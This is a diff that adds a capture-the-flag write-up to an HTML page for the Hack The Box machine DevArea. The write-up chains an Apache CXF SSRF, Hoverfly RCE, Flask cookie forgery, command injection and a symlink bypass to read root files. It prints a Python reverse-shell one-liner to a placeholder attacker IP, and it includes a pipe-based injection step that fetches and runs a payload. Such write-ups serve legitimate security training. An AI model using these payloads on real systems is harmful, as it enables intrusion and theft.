@@ -32,6 +32,7 @@
   <script src="https://cdn.jsdelivr.net/npm/prismjs/components/prism-python.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/prismjs/components/prism-go.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/prismjs/components/prism-bash.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs/components/prism-java.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/prismjs/components/prism-cshtml.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/prismjs/components/prism-javascript.min.js"></script>
 
@@ -67,7 +68,7 @@
         </div>
         <div>
           <span class="meta-label">Platform</span>
-          <span class="meta-value" , src="color:green">HackTheBox</span>
+          <span class="meta-value" , src="color:green">Hack The Box</span>
         </div>
         <div>
           <span class="meta-label">IP Address</span>
@@ -81,16 +82,458 @@
   <main class="challenge-main">
     <section aria-labelledby="overview-title" class="card section-overview">
       <header class="section-heading">
-        <p class="eyebrow">Disclaimer </p>
-        <h2 id="overview-title">Disclaimer</h2>
+        <p class="eyebrow">Summary </p>
+        <h2 id="overview-title">Machine Overview</h2>
       </header>
-      <p>
-        <strong>Due to Hack The Box rules, we cannot share write-ups or solutions for active machines. Write-ups will be
-          published once the machines are retired.</strong>
-      </p>
+      <p>DevArea is a medium-difficulty Linux machine on Hack The Box that demonstrates a multi-stage attack chain involving anonymous FTP access, Java application analysis, an Apache CXF SSRF vulnerability, local file disclosure, Hoverfly exploitation, Flask session forgery, command injection, and a symbolic-link validation bypass leading to root-level file access.</p>
     </section>
 
-    <section aria-labelledby="overview-title" class="card section-overview" >
+    <section aria-labelledby="description-title" class="card section-description">
+      <header class="section-heading">
+        <p class="eyebrow">Pentesting Process</p>
+        <h2 id="description-title">Service Enumeration</h2>
+      </header>
+      <p>
+        We started our assessment by performing a comprehensive port scan using <strong>Nmap</strong> to identify open ports and services running on the target machine. The command we used was:
+      </p>
+      <p class="center-code">
+        <code class="language-bash">nmap -sC -sV 10.129.17.196</code>
+      </p>
+      <p>
+        We identified 3 accessible services:
+      </p>
+      <p>
+      <pre class="terminal">
+              <code>
+PORT     STATE    SERVICE       VERSION
+21/tcp   open     ftp           vsftpd 3.0.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
+22/tcp   open     ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+49/tcp   filtered tacacs
+80/tcp   open     http          Apache httpd 2.4.58
+8080/tcp open     http          Jetty 9.4.27.v20200227
+8500/tcp open     fmtp?
+8888/tcp open     http          Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+            </code></pre>
+      </p>
+
+      <p>For simplicity, we mapped the target IP address to the domain <code>devarea.htb</code> by adding an entry to the local <code>/etc/hosts</code> file.</p>
+      
+      <header class="section-heading">
+        <h2 id="description-title">Initial Access</h2>
+      </header>
+      <header class="section-heading">
+        <h3 id="description-title">FTP Anonymous Access</h3>
+      </header>
+      <p>The FTP service allows anonymous authentication, providing access to the <code>pub</code> directory. We enumerated the available files and discovered <strong>employee-service.jar</strong>.</p>
+      <p>We downloaded the JAR file for further analysis, as it could contain information about the applications and services running on the target.</p>
+      <header class="section-heading">
+        <h3 id="description-title">JAR File Inspection</h3>
+      </header>
+      <p>We analyzed the JAR file using <strong>JD-GUI</strong> to decompile the application and inspect its classes and packages.</p>
+      <p>The JAR file contained several packages, including <strong>htb.devarea</strong>. This package contained the backend implementation of the Employee Service exposed on port <strong>8080</strong>.</p>
+      <p>
+        <code class="language-java">package htb.devarea;
+
+import org.apache.cxf.jaxws.JaxWsServerFactoryBean;
+
+public class ServerStarter {
+  public static void main(String[] args) {
+    JaxWsServerFactoryBean factory = new JaxWsServerFactoryBean();
+    factory.setServiceClass(EmployeeService.class);
+    factory.setServiceBean(new EmployeeServiceImpl());
+    factory.setAddress("http://0.0.0.0:8080/employeeservice");
+    factory.create();
+    System.out.println("Employee Service running at http://localhost:8080/employeeservice");
+    System.out.println("WSDL available at http://localhost:8080/employeeservice?wsdl");
+  }
+}</code>
+      </p>
+      <p>This service was implemented using the Apache CXF framework and was exposed at <code>http://localhost:8080/employeeservice</code>.</p>
+      <header class="section-heading">
+        <h3 id="description-title">Apache CXF Analysis</h3>
+      </header>
+      <p>The Employee Service is implemented using the Apache CXF framework. At this stage, we did not yet know which version of CXF was deployed on the target.</p>
+      <p>We reviewed the Apache CXF security advisories <a class="ref" href="#references">[1]</a> and investigated the known vulnerabilities affecting the framework. We then identified publicly available proof-of-concept exploits and tested the relevant vulnerabilities against the target service.</p>
+
+      <p>During this process, we identified <strong>CVE-2022-46364</strong>, a Server-Side Request Forgery (SSRF) vulnerability affecting Apache CXF. A publicly available proof of concept was available for this vulnerability <a class="ref" href="#references">[2]</a>, allowing us to test whether the target application was exploitable.</p>
+      <p>The service is vulnerable to <strong>CVE-2022-46364</strong>, which was used to read local files on the server including the <code>/etc/passwd</code> file.</p>
+      <p>
+        <img src="./assets/SSRF-passwd.png" width="100%"/>
+      </p>
+
+      <header class="section-heading">
+        <h3 id="description-title">Local File Extraction</h3>
+      </header>
+
+      <p>The previous SSRF exploit allowed us to read local files on the server. We will use this capability to extract sensitive information that will help us in the pentesting process.</p>
+      <p>The target is running a Hoverfly server listening on port <code>8888</code>. This server is protected by an authentication mechanism.</p>
+      <p><img src="assets/hoverfly.png" width="80%"/></p>
+      <p>We used the SSRF vulnerability to extract the systemd file responsible for managing the Hoverfly service.</p>
+      <p><code class="language-bash">python CVE-2022-46364.py -t http://devarea.htb:8080/employeeservice -s file:///etc/systemd/system/hoverfly.service -d devarea.htb</code></p>
+      <p><pre class="terminal"><code>
+[Unit]
+Description=HoverFly service
+After=network.target
+
+[Service]
+User=dev_ryan
+Group=dev_ryan
+WorkingDirectory=/opt/HoverFly
+ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
+
+Restart=on-failure
+RestartSec=5
+StartLimitIntervalSec=60
+StartLimitBurst=5
+LimitNOFILE=65536
+StandardOutput=journal
+StandardError=journal
+
+[Install]
+WantedBy=multi-user.target
+
+</code></pre></p>
+    <p>Now we have the credentials for the Hoverfly service, and we can use them to access the service.</p>
+
+    <header class="section-heading">
+        <h3 id="description-title">HoverFly Enumeration</h3>
+    </header>
+    <p>The server is running an instance of <strong>HoverFly 1.11.3</strong>.</p>
+    <p><img src="assets/hoverfly_version.png" width="60%"/></p>
+    <p>This version is vulnerable to Remote Code Execution, identified as <strong>CVE-2025-54123</strong>.</p>
+    <p>A public exploit is available on GitHub <a class="ref" href="#references">[3]</a>.</p>
+    <p><img src="assets/hoverfly_rce.png" width="100%"/></p>
+
+    <p>To get a reverse shell, we will use the following payload:</p>
+    <p><code class="language-bash">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;ATTCKER_IP&gt;",&lt;ATTCKER_PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</code></p>
+    <p>As a result, we got a reverse shell as the user <code>dev_ryan</code>:</p>
+    <p><img src="assets/rev_shell.png" width="60%"/></p>
+
+    
+    <header class="section-heading">
+        <h2 id="description-title">Post-Exploitation</h2>
+    </header>
+    <header class="section-heading">
+        <h3 id="description-title">Syswatch Archive Analysis</h3>
+    </header>
+    <p>We enumerated the files in the home directory of the user <code>dev_ryan</code>. We found the user flag file (<code>user.txt</code>) and an archive file named <code>syswatch-v1.zip</code>, which we downloaded for further analysis.</p>
+
+    <p>We extracted the archive and found a shell script named <strong>setup.sh</strong> that contains environment-sensitive information generation logic.</p>
+    
+    <p><code class="language-bash">python3 -m venv &quot;&dollar;OPT&lowbar;DIR&sol;venv&quot;&NewLine;&quot;&dollar;OPT&lowbar;DIR&sol;venv&sol;bin&sol;pip&quot; install --upgrade pip&NewLine;&quot;&dollar;OPT&lowbar;DIR&sol;venv&sol;bin&sol;pip&quot; install -r &quot;&dollar;OPT&lowbar;DIR&sol;syswatch&lowbar;gui&sol;requirements&period;txt&quot;&NewLine;ENV&lowbar;FILE&equals;&quot;&sol;etc&sol;syswatch&period;env&quot;&NewLine;SECRET&equals;&quot;&dollar;&lcub;SYSWATCH&lowbar;SECRET&lowbar;KEY&colon;-&rcub;&quot;&NewLine;ADMIN&equals;&quot;&dollar;&lcub;SYSWATCH&lowbar;ADMIN&lowbar;PASSWORD&colon;-&rcub;&quot;&NewLine;if &lsqb; -z &quot;&dollar;SECRET&quot; &rsqb;&semi; then&NewLine;  if command -v openssl &gt;&sol;dev&sol;null 2&gt;&amp;1&semi; then&NewLine;    SECRET&equals;&quot;&dollar;&lpar;openssl rand -hex 32&rpar;&quot;&NewLine;  else&NewLine;    SECRET&equals;&quot;&dollar;&lpar;head -c 32 &sol;dev&sol;urandom &verbar; xxd -p&rpar;&quot;&NewLine;  fi&NewLine;fi&NewLine;&lsqb; -z &quot;&dollar;ADMIN&quot; &rsqb; &amp;&amp; ADMIN&equals;&quot;SyswatchAdmin2026&quot;&NewLine;cat &gt; &quot;&dollar;ENV&lowbar;FILE&quot; &lt;&lt;EOF&NewLine;SYSWATCH&lowbar;SECRET&lowbar;KEY&equals;&dollar;SECRET&NewLine;SYSWATCH&lowbar;ADMIN&lowbar;PASSWORD&equals;&dollar;ADMIN&NewLine;SYSWATCH&lowbar;LOG&lowbar;DIR&equals;&dollar;OPT&lowbar;DIR&sol;logs&NewLine;SYSWATCH&lowbar;DB&lowbar;PATH&equals;&dollar;OPT&lowbar;DIR&sol;syswatch&lowbar;gui&sol;syswatch&period;db&NewLine;SYSWATCH&lowbar;PLUGIN&lowbar;DIR&equals;&dollar;OPT&lowbar;DIR&sol;plugins&NewLine;SYSWATCH&lowbar;BACKUP&lowbar;DIR&equals;&dollar;OPT&lowbar;DIR&sol;backup&NewLine;SYSWATCH&lowbar;VERSION&equals;1&period;0&period;0&NewLine;EOF&NewLine;&NewLine;&lt;&excl;-- Snippet --&gt;&NewLine;&NewLine;&num;if command -v ufw &gt;&sol;dev&sol;null 2&gt;&amp;1&semi; then ufw allow 7777&sol;tcp &verbar;&verbar; true&semi; fi</code></p>
+    <p>A comment in the setup script indicates that port 7777 is used by the local web server. Later, we were able to verify that this port is open and used by the application.</p>
+    
+    <p>The environment variables are stored in a file that we can read.</p>
+    <p><code class="language-bash">cat /etc/syswatch.env</code></p>
+    <p><pre class="terminal"><code>
+SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725
+SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026
+SYSWATCH_LOG_DIR=/opt/syswatch/logs
+SYSWATCH_DB_PATH=/opt/syswatch/syswatch_gui/syswatch.db
+SYSWATCH_PLUGIN_DIR=/opt/syswatch/plugins
+SYSWATCH_BACKUP_DIR=/opt/syswatch/backup
+SYSWATCH_VERSION=1.0.0
+    </code></pre></p>
+
+    <header class="section-heading">
+        <h3 id="description-title">Sudo Access</h3>
+    </header>
+
+    <p>The user <code>dev_ryan</code> can execute a shell script with higher privileges.</p>
+    <p><code class="language-bash">sudo -l</code></p>
+    <p>
+      <pre class="terminal"><code>
+Matching Defaults entries for dev_ryan on devarea:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User dev_ryan may run the following commands on devarea:
+    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop,
+        !/opt/syswatch/syswatch.sh web-restart
+    </code></pre>
+    </p>
+    <p>The archive that we found earlier contains the SysWatch setup script. The script can be used to perform different tasks:</p>
+    <p><code class="language-bash">usage() {
+    echo "SysWatch $VERSION"
+    echo "Usage: $0 <command> [args]"
+    echo "Commands:"
+    echo "  web                 Start web GUI"
+    echo "  web-stop            Stop web GUI"
+    echo "  web-restart         Restart web GUI"
+    echo "  web-status          Show web GUI status"
+    echo "  plugin <name> [args] Execute plugin"
+    echo "  plugins             List available plugins"
+    echo "  logs <file>         View log file"
+    echo "  logs --list         List available log files"
+    echo "  --version           Show version"
+    echo "  --help|-h|help      Show this help"
+}</code></p>
+
+  <p>The script can be used to read logs from a specific directory.</p>
+  <p>
+    <code class="language-bash">CONFIG_FILE="/opt/syswatch/config/syswatch.conf"
+SYSWATCH_USER="syswatch"
+PLUGIN_DIR="/opt/syswatch/plugins"
+LOG_DIR="/opt/syswatch/logs"
+SAFE_PLUGIN_REGEX='^[a-zA-Z0-9_.\-$]+$'
+SAFE_LOG_REGEX='^[A-Za-z0-9_.-]+$'
+VERSION="1.0.0"
+source "$CONFIG_FILE"
+RUN_AS_ROOT_PLUGINS=("log_monitor.sh")
+LIST_EXCLUDE=("common.sh")
+
+&lt;&excl;-- Snippet --&gt;
+
+view_logs() {
+    local arg="${1:-}"
+
+    # ---- LIST MODE ----
+    if [ "$arg" = "--list" ] || [ "$arg" = "list" ]; then
+        local found=0
+        for p in "$LOG_DIR"/*.log; do
+            [ -e "$p" ] || continue
+            [ -L "$p" ] && continue       # skip symlinks in list
+            [ -f "$p" ] || continue
+            echo " - $(basename "$p")"
+            found=1
+        done
+        [ "$found" -eq 0 ] && echo "[No logs found]"
+        return
+    fi
+
+    # FILE NAME VALIDATION
+    local file="${arg:-system.log}"
+    if [[ ! "$file" =~ $SAFE_LOG_REGEX ]]; then
+        echo "[Invalid log filename]: $file"
+        return 1
+    fi
+
+    local path="$LOG_DIR/$file"
+    if [ -L "$path" ]; then
+        local target
+        target=$(ls -l "$path" | awk '{print $NF}')
+
+        if [[ "$target" == *"/"* || "$target" == *".."* || "$target" == *"\\"* ]]; then
+            echo "[Blocked unsafe symlink target]: $file -> $target"
+            return 1
+        fi
+
+        if [[ "$target" =~ ^[A-Za-z0-9_.-]+$ ]]; then
+            local resolved="$LOG_DIR/$target"
+            if [ -f "$resolved" ]; then
+                cat "$resolved"
+                return
+            else
+                echo "[Symlink target not found]: $file -> $target"
+                return 1
+            fi
+        fi
+
+        if [[ "$target" == /var/log/* ]]; then
+            [ -f "$target" ] && cat "$target" && return
+            echo "[Symlink target not regular file]: $file -> $target"
+            return 1
+        fi
+
+        echo "[Refusing unsafe symlink]: $file -> $target"
+        return 1
+    fi
+
+    if [[ "$file" == */* || "$file" == *".."* ]]; then
+        echo "[Blocked unsafe filename]: $file"
+        return 1
+    fi
+    
+    if [ -f "$path" ]; then
+        cat "$path"
+    else
+        echo "[Log file not found]: $file"
+    fi
+}</code>
+  </p>
+
+  <p>The log directory is owned by the <code>syswatch</code> user, and only that user can write to the log files.</p>
+
+  <p><code class="language-bash">ls -la /opt/syswatch</code></p>
+  <p><pre class="terminal"><code>
+total 44
+drwxr-xr-x+ 8 root     root     4096 Mar 22 18:55 .
+drwxr-xr-x  5 root     root     4096 Mar 22 18:55 ..
+drwxr-xr-x  2 syswatch syswatch 4096 Mar 22 18:55 backup
+drwxr-xr-x  2 root     root     4096 Mar 22 18:55 config
+drwxr-xr-x  2 syswatch syswatch 4096 Mar 22 18:55 logs
+-rwxr-xr-x  1 root     root      265 Dec 12  2025 monitor.sh
+drwxr-xr-x  2 root     root     4096 Mar 22 18:55 plugins
+drwxr-xr-x  4 root     root     4096 Mar 22 18:55 syswatch_gui
+-rwxr-xr-x  1 root     root     6103 Dec 14  2025 syswatch.sh
+drwxr-xr-x  5 root     root     4096 Mar 22 18:55 venv
+    </code></pre></p>
+
+    <header class="section-heading">
+        <h3 id="description-title">Local Web Server</h3>
+    </header>
+    <p>Syswatch application is running locally on port 7777.</p>
+    <p><code class="language-bash">netstat -tlnp</code></p>
+    <p><pre class="terminal"><code>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:7777          0.0.0.0:*               LISTEN      -                          
+tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::8080                 :::*                    LISTEN      1427/java           
+tcp6       0      0 ::1:25                  :::*                    LISTEN      -                   
+tcp6       0      0 :::8888                 :::*                    LISTEN      1428/hoverfly       
+tcp6       0      0 :::8500                 :::*                    LISTEN      1428/hoverfly       
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::21                   :::*                    LISTEN      -                          LISTEN      1234/syswatch
+    </code></pre></p>
+    <p>To access the application remotely, we generated SSH keys for the user <code>dev_ryan</code> and used them to establish a port-forwarding tunnel to the application.</p>
+    <p><code class="language-bash">mkdir -p ~/.ssh/mykeys && ssh-keygen -t ed25519 -f ~/.ssh/mykeys/id_ed25519 -N "" && cat ~/.ssh/mykeys/id_ed25519.pub >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && cat ~/.ssh/mykeys/id_ed25519</code></p>
+    <p><img src="assets/ssh_generation.png" width="60%"/></p>
+
+    <p>We established a port forwarding tunnel to the application using the generated SSH keys.</p>
+    <p><code class="language-bash">ssh -i dev_ryan_ssh_key dev_ryan@devarea.htb -L 7777:127.0.0.1:7777</code></p>
+    <p>We can now access the application remotely:</p>
+    <p><img src="assets/syswatch.png" width="80%"/></p>
+    <p>The AdminPassword was used as the password, but it did not work, and we were unable to read the database due to a lack of permissions.</p>
+    <p>The application is using Flask (Imported in the main script <code>syswatch-v1/syswatch/syswatch_gui/app.py</code>). We know the secret key, which can be used to create valid cookies to access the application. To do this, we used the tool <code>flask-unsign</code>.</p>
+
+    <p>We tried to create a cookie with the following command:</p>
+    <p><code class="language-bash">flask-unsign --sign --cookie "{'logged_in': True}" --secret 'f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725'</code></p>
+    <p>
+      <pre class="terminal"><code>
+eyJsb2dnZWRfaW4iOnRydWV9.alrZpA.Cjaf7YX3fhpCoe7nTdbO1Ugawfw
+      </code></pre>
+    </p>
+    <p>We used this cookie in our browser, but it did not work. We then changed the format of the cookie to include the user ID and username:</p>
+    <p><code class="language-bash">flask-unsign --sign --cookie '{"user_id": 1, "username": "admin"}' --secret 'f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725' </code></p>
+    <p>
+      <pre class="terminal"><code>
+eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.alrgAg.eoL6QLprheBinmUDZKRVmpT81Ng
+      </code></pre>
+   </p>
+   <p>We used the generated cookie, and it worked:</p>
+   <p><img src="assets/syswatch__.png" width="80%"/></p>
+
+   <p>The application has a form that allows users to check the status of services:</p>
+
+  <p><img src="assets/syswatch_checkstatus.png" width="80%"/></p>
+
+  <p>The application takes the service name from user input, filters it, and checks its status by executing a system command:</p>
+    <p>
+  <code class="language-python">SAFE_SERVICE = re.compile(r"^[^;/\&.&lt;&gt;\rA-Z]*$")
+
+def service_status():
+    r = require_login()
+    if r:
+        return r
+    output = None
+    error = None
+    service = ""
+    if request.method == "POST":
+        service = request.form.get("service", "").strip()
+        if not service or not SAFE_SERVICE.match(service):
+            error = "Invalid service name"
+        else:
+            try:
+                res = subprocess.run([f"systemctl status --no-pager {service}"], shell=True,capture_output=True, text=True, timeout=10)
+                output = res.stdout if res.stdout else res.stderr
+            except Exception as e:
+                error = str(e)
+    return render_template("service_status.html", output=output, error=error, service=service)</code>
+  </p>
+
+  <p>The filters prevent the use of some characters that could be used for command injection. However, they do not prevent the use of the pipe character <code>"|"</code>. We will use this to access a locally hosted application listening on port 4444.</p>
+  <p><img src="assets/command_injection.png" width="80%"/></p>
+  <p>Here, we used the decimal representation of our IP address because the character <code>"."</code> is not allowed. We received the following curl request:</p>
+  <p><img src="assets/curl_request.png" width="50%"/></p>
+
+  <p>On our machine, we created a file named <code>index.html</code> that contains the following script:</p>
+  <p><code class="language-bash">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;ATTACKER_IP&gt;",&lt;ATTACKER_PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</code></p>
+  
+  <p>We hosted this file on an HTTP server listening on port 4444. We then used the same form we used earlier to make the server access the file with curl and execute the script through bash.</p>
+  <p><img src="assets/revshell.png" width="80%"/></p>
+  <p>As a result, we got a reverse shell as <code>syswatch</code>:</p>
+  <p><img src="assets/rev_shell_syswatch.png" width="80%"/></p>
+  
+  <header class="section-heading">
+        <h3 id="description-title">Log file manipulation</h3>
+  </header>
+
+  <p>Now we have access as <code>syswatch</code>, so we can modify the log files used by the SysWatch tool:</p>
+  <p>We created a symbolic link in the log directory that points to the root flag:</p>
+  <p><code class="language-bash">ln -s /root/root.txt root.log</code></p>
+
+  <p>We then use the syswatch tool to view the log:</p>
+  <p><code class="language-bash">sudo /opt/syswatch/syswatch.sh logs root.log</code></p>
+  <p>We got the following error:</p>
+  <p><pre class="terminal"><code>
+[Blocked unsafe symlink target]: root.log -> /root/root.txt
+  </code></pre></p>
+
+  <p>We then created two symbolic links: one pointing to the root flag and another one pointing to the symbolic link that we just created:</p>
+  <p><code class="language-bash">ln -s /root/root.txt root.log
+ln -s root.log root1.log
+  </code></p>
+  <p>We then used the SysWatch tool to view the log:</p>
+  <p><img src="assets/root_flag.png" width="80%"/></p>
+  <p>The same technique can be used to read root owned files, including the root user's SSH keys.</p>
+
+
+  </section>
+
+    <section aria-labelledby="overview-title" class="card section-overview">
+      <header class="section-heading">
+        <p class="eyebrow">Mitigation</p>
+        <h2 id="overview-title">Remediation</h2>
+      </header>
+      <p>
+        The following remediation steps can help prevent exploitation of the identified vulnerabilities:
+      </p>
+      <ul>
+        <li>Upgrade Apache CXF to version 3.5.5 or later.</li>
+        <li>Upgrade Hoverfly to version 1.12.0 or later.</li>
+        <li>Implement proper input validation and sanitization.</li>
+      </ul>
+    </section>
+
+    <section aria-labelledby="overview-title" class="card section-overview" id="references">
+      <header class="section-heading">
+        <p class="eyebrow">References</p>
+        <h2 id="overview-title">References</h2>
+      </header>
+
+      <ol type="1" style="list-style-type: none; counter-reset: ref-counter;">
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">1</span>]</span>
+          <a href="https://cxf.apache.org/security-advisories.html"
+            target="_blank" rel="noopener noreferrer">
+            Apache CFX | Apache CXF -- Security Advisories</a>
+        </li>
+
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">2</span>]</span>
+          <a href="https://github.com/kasem545/CVE-2022-46364-Poc"
+            target="_blank" rel="noopener noreferrer">
+            GitHub | CVE-2022-46364 Exploit</a>
+        </li>
+
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">3</span>]</span>
+          <a href="https://github.com/kasem545/CVE-2025-54123-Poc"
+            target="_blank" rel="noopener noreferrer">
+            GitHub | CVE-2025-54123 Exploit</a>
+        </li>
+
+      </ol>
+    </section>
+
+
+    <section aria-labelledby="overview-title" class="card section-overview">
       <header class="section-heading">
         <p class="eyebrow">Proof of Completion</p>
         <h2 id="overview-title">Proof of Completion</h2>
